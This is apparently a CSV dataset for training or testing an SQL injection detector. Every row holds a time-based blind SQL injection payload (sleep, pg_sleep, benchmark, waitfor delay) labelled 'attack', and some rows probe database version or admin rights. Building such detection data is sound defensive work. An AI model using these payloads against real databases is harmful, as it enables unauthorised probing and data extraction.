id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000038,attack,time,"1  )   as qyic where 9736  =  9736 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000291,0.6069431945262829
SMOTE_000039,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,0.9364496778525837
SMOTE_000040,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'bemh'  =  'bemh",nearest_attack_euclidean,R000292,1.1328081794368443
SMOTE_000041,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R000213,1.2908754900866881
SMOTE_000042,attack,time,1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000155,0.5215037904164397
SMOTE_000043,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,1.1486437142088486
SMOTE_000044,attack,time,1'||  (  select 'bsbv' from dual where 5276  =  5276 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',nearest_attack_euclidean,R000113,0.5258068907349724
SMOTE_000045,attack,time,"1"" where 7371  =  7371 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000263,1.0098582043802034
SMOTE_000046,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000125,0.3637676834643923
SMOTE_000047,attack,time,1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000147,1.5529650644845032
SMOTE_000048,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,1.1808687001358902
SMOTE_000049,attack,time,waitfor delay '0:0:5',nearest_attack_euclidean,R000307,0.26729898334827756
SMOTE_000050,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.7450311944348995
SMOTE_000051,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.16017281960545018
SMOTE_000052,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.6080033982575712
SMOTE_000053,attack,time,1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000155,0.011899575907101667
SMOTE_000054,attack,time,1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,nearest_attack_euclidean,R000193,0.046110184098455444
SMOTE_000055,attack,time,"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000175,0.04694770776368248
SMOTE_000056,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,0.9323313814690287
SMOTE_000057,attack,time,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000075,0.08920518144749937
SMOTE_000058,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,2.013443038684262
SMOTE_000059,attack,time,"1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000248,1.0733812697094427
SMOTE_000060,attack,time,begin user_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000191,0.25681090742623286
SMOTE_000061,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000108,0.2805432306536763
SMOTE_000062,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000043,0.04622632277998702
SMOTE_000063,attack,time,"1%"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000237,0.036020540685258264
SMOTE_000064,attack,time,1 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000255,0.005606815964227042
SMOTE_000065,attack,time,"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",nearest_attack_euclidean,R000196,0.44066750534119414
SMOTE_000066,attack,time,waitfor delay '0:0:5'# ogzq,nearest_attack_euclidean,R000173,0.25491755605103794
SMOTE_000067,attack,time,"1"" waitfor delay '0:0:5'",nearest_attack_euclidean,R000202,0.8768463775577726
SMOTE_000068,attack,time,"select benchmark  (  5000000,md5  (  0x714e4153   )    )   #",nearest_attack_euclidean,R000216,0.786108758016081
SMOTE_000069,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.0618707414816209
SMOTE_000070,attack,time,"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000089,1.9711198347952776
SMOTE_000071,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R000107,3.7858189313224067
SMOTE_000072,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000172,0.6261281886222794
SMOTE_000073,attack,time,1'||  (  select 'tcfy' where 4546  =  4546 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000228,1.463232166039873
SMOTE_000074,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.667636908016382
SMOTE_000075,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",nearest_attack_euclidean,R000063,0.8664694124377164
SMOTE_000076,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.6480651557156875
SMOTE_000077,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.9080283966051877
SMOTE_000078,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000071,0.0952802860710104
SMOTE_000079,attack,time,1%' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000167,1.0050743371566524
SMOTE_000080,attack,time,1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000223,0.34166763946166806
SMOTE_000081,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000231,0.5178922154651127
SMOTE_000082,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000067,0.07441837981290997
SMOTE_000083,attack,time,"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",nearest_attack_euclidean,R000196,0.4437227724804901
SMOTE_000084,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000247,0.6181684480522831
SMOTE_000085,attack,time,"waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000093,2.443055061750971
SMOTE_000086,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R000244,1.9640973621357654
SMOTE_000087,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,1.3121343071821414
SMOTE_000088,attack,time,"waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000093,1.6004333733934737
SMOTE_000089,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000164,0.5883745321680457
SMOTE_000090,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.4117377472979098
SMOTE_000091,attack,time,1'||  (  select 'wszt' from dual where 6854  =  6854 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000170,1.6813070110502593
SMOTE_000092,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.6968844258147929
SMOTE_000093,attack,time,1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000139,1.1450037744010364
SMOTE_000094,attack,time,1 waitfor delay '0:0:5',nearest_attack_euclidean,R000238,0.5985443463949337
SMOTE_000095,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000125,0.36257204160155726
SMOTE_000096,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000123,0.1817626142876818
SMOTE_000097,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000099,0.8538266650604662
SMOTE_000098,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.008590776783916992
SMOTE_000099,attack,time,"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",nearest_attack_euclidean,R000132,1.6919490715378123
SMOTE_000100,attack,time,begin user_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000191,0.29083369528904124
SMOTE_000101,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000125,0.7868139444225227
SMOTE_000102,attack,time,"1"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R000168,0.6808124286948046
SMOTE_000103,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.5715708858783275
SMOTE_000104,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R000197,0.3386664529435227
SMOTE_000105,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.9366648520832483
SMOTE_000106,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",nearest_attack_euclidean,R000145,0.4304872807336083
SMOTE_000107,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000076,0.4588149409582062
SMOTE_000108,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000070,0.5639499079362642
SMOTE_000109,attack,time,"1'  )   as ohcs where 9588  =  9588 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000221,1.6088652744380951
SMOTE_000110,attack,time,1%' rlike sleep  (  5  )  #,nearest_attack_euclidean,R000091,0.6235389360812827
SMOTE_000111,attack,time,select sleep  (  5  )  # yrpn,nearest_attack_euclidean,R000285,0.054998002302799026
SMOTE_000112,attack,time,1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000126,0.5523362237595708
SMOTE_000113,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000069,1.8462000998418817
SMOTE_000114,attack,time,"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",nearest_attack_euclidean,R000179,0.2749233982500927
SMOTE_000115,attack,time,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000157,0.3135514659331078
SMOTE_000116,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   -- rlas",nearest_attack_euclidean,R000120,1.423454350053275
SMOTE_000117,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000164,0.033903232025623856
SMOTE_000118,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.6542615884936522
SMOTE_000119,attack,time,"1'||  (  select 'jrbp' from dual where 4129  =  4129 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000219,1.4851030824231595
SMOTE_000120,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000103,0.3435805214213973
SMOTE_000121,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.5263812206710392
SMOTE_000122,attack,time,"1"" rlike sleep  (  5  )  ",nearest_attack_euclidean,R000141,0.0186820273661139
SMOTE_000123,attack,time,1 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000255,0.4358323503431794
SMOTE_000124,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000186,0.5438417456802404
SMOTE_000125,attack,time,"waitfor delay '0:0:5' and   (  ""dmcu""  =  ""dmcu",nearest_attack_euclidean,R000306,0.04062461585690226
SMOTE_000126,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.859005962652685
SMOTE_000127,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.17531579666952704
SMOTE_000128,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.009796180923661238
SMOTE_000129,attack,time,1 waitfor delay '0:0:5',nearest_attack_euclidean,R000238,0.8713996903057247
SMOTE_000130,attack,time,"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000154,1.40214902474955
SMOTE_000131,attack,time,1'||  (  select 'ypqa' where 1961  =  1961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000282,1.015347634280844
SMOTE_000132,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000072,0.18798957941870026
SMOTE_000133,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000300,0.4331880467558573
SMOTE_000134,attack,time,"1  )   as qyic where 9736  =  9736 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000291,1.2681825707203507
SMOTE_000135,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000065,0.29841440992218426
SMOTE_000136,attack,time,"1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000190,0.25417153279895366
SMOTE_000137,attack,time,1' and sleep  (  5  )   and 'usgv' like 'usgv,nearest_attack_euclidean,R000081,0.9408192542586716
SMOTE_000138,attack,time,"1,  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R000198,1.5207337532913663
SMOTE_000139,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000067,0.2219553836778027
SMOTE_000140,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000115,0.16535291030831298
SMOTE_000141,attack,time,"1""   )    )    as wugz where 5355  =  5355 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000230,1.0098955035728951
SMOTE_000142,attack,time,1 where 9620  =  9620 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000146,0.2302037772248881
SMOTE_000143,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000057,0.7198205366627034
SMOTE_000144,attack,time,"1%"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R000242,0.0004052501695047984
SMOTE_000145,attack,time,"1%"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000237,0.2550969193890777
SMOTE_000146,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'vmuj' like 'vmuj",nearest_attack_euclidean,R000295,0.1469640637496186
SMOTE_000147,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.2570459173598681
SMOTE_000148,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.07473969431431297
SMOTE_000149,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000102,2.1419828596283788
SMOTE_000150,attack,time,select sleep  (  5  )  # yrpn,nearest_attack_euclidean,R000285,0.022802169324222826
SMOTE_000151,attack,time,"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000293,0.10197895385296525
SMOTE_000152,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.073242144034726
SMOTE_000153,attack,time,1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,nearest_attack_euclidean,R000210,0.5734074105666825
SMOTE_000154,attack,time,1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000223,1.1512702766200034
SMOTE_000155,attack,time,waitfor delay '0:0:5' and '%'  =  ',nearest_attack_euclidean,R000257,1.171806965028537
SMOTE_000156,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000212,0.5195306517575713
SMOTE_000157,attack,time,"1'   )    )    as fusi where 2788  =  2788 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000246,0.4528583765064275
SMOTE_000158,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,nearest_attack_euclidean,R000136,0.8573377724321872
SMOTE_000159,attack,time,1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  #,nearest_attack_euclidean,R000205,0.7890315801069898
SMOTE_000160,attack,time,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",nearest_attack_euclidean,R000177,0.1012004027873819
SMOTE_000161,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000300,0.41395152760654685
SMOTE_000162,attack,time,"1"" rlike sleep  (  5  )  ",nearest_attack_euclidean,R000141,0.7530692221675668
SMOTE_000163,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000115,0.1346933945599207
SMOTE_000164,attack,time,"1"" waitfor delay '0:0:5'",nearest_attack_euclidean,R000202,0.4340050237252059
SMOTE_000165,attack,time,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",nearest_attack_euclidean,R000177,0.5654717211850613
SMOTE_000166,attack,time,1'||  (  select 'wszt' from dual where 6854  =  6854 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000170,1.6077408065602834
SMOTE_000167,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000103,0.5192320838588526
SMOTE_000168,attack,time,"1'+  (  select iaeu where 5509  =  5509 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000302,0.12847960406189063
SMOTE_000169,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.19208656188428722
SMOTE_000170,attack,time,"waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000093,0.9748930125334222
SMOTE_000171,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000300,0.013795910921269253
SMOTE_000172,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'vmuj' like 'vmuj",nearest_attack_euclidean,R000295,0.8344231165154465
SMOTE_000173,attack,time,"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000215,0.5046562093781366
SMOTE_000174,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000180,0.014498120359785817
SMOTE_000175,attack,time,waitfor delay '0:0:5'# ogzq,nearest_attack_euclidean,R000173,0.8703243026418606
SMOTE_000176,attack,time,1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000077,1.9556529088986734
